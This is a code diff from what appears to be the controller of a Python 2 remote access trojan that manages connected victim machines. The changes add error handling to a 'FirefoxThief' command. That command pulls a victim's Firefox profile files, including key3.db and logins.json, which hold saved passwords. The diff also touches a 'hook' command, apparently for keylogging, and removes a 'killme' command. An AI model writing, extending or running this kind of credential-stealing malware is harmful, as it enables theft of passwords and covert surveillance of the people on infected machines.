@@ -158,32 +158,39 @@ while True:
                 print (("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0)))
                 connstream.close()
                 break
-            elif inText == "killme":
-                SendData("terminate")
-                print (("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0)))
-                connstream.close()
-                break
             elif inText == "FirefoxThief":
                 SendData("FirefoxThief")
-                print "[profiles]\n"
-                listDir = RecvData()
-                print (listDir)
-                newdir = raw_input("[DumpDir] ")
-                SendData(newdir)
-                DownloadFILE("profiles.ini")
-                print "[+] Dumping cert8.db, key3.db and logins.json..."
-                DownloadFILE("cert8.db")
-                DownloadFILE("key3.db")
-                DownloadFILE("logins.json")
-                print colored.green("Finished")
+                plat = RecvData()
+                if plat.startswith("Ok"):
+                    listDir = RecvData()
+                    if listDir.startswith("Error"):
+                        print colored.red(listDir)
+                    else:
+                        print "[profiles]\n"
+                        print (listDir)
+                        newdir = raw_input("[DumpDir] ")
+                        SendData(newdir)
+                        DownloadFILE("profiles.ini")
+                        print "[+] Dumping cert8.db, key3.db and logins.json..."
+                        DownloadFILE("cert8.db")
+                        DownloadFILE("key3.db")
+                        DownloadFILE("logins.json")
+                        print colored.green("Finished")
+                elif plat.startswith("Error"):
+                    print colored.red(plat)
+                else:
+                    print colored.red("Error not handled")
             elif inText.startswith("hook"):
                 if inText.split(":")[1] == "":
                     print "usage:\n" + "-- start --> hook:ON \n" + "-- check --> hook:check"
                     print "-- stop --> hook:OFF\n"
-                    usage = raw_input()
+                    usage = raw_input("> ")
                     SendData(usage)
                     retstat = RecvData()
-                    print colored.green("==> HOOK"+retstat)
+                    if retstat.startswith("Error"):
+                        print colored.red(retstat)
+                    else:
+                        print colored.green("==> HOOK"+retstat)
                 else:
                     SendData(inText)
                     retstat = RecvData()
